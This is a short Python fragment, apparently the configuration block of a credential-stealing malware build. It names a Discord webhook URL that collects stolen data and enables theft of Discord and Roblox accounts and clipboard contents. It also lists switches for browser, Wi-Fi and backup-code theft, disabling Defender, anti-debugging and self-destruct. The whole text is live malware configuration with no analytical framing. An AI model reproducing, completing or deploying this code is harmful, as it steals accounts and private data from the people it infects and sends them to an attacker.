...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1225535183294300283/tUqotf3mGevxc0YaMMO2dd0DV_Izd4e15enfcDcWhBbZjKAbiWzMEX9GiizN76zJsBGg', 'ping': True, 'pingtype': 'Everyone', 'fakeerror': False, 'startup': False, 'defender': False, 'systeminfo': False, 'backupcodes': False, 'browser': False, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': False, 'wifi': False, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': True}
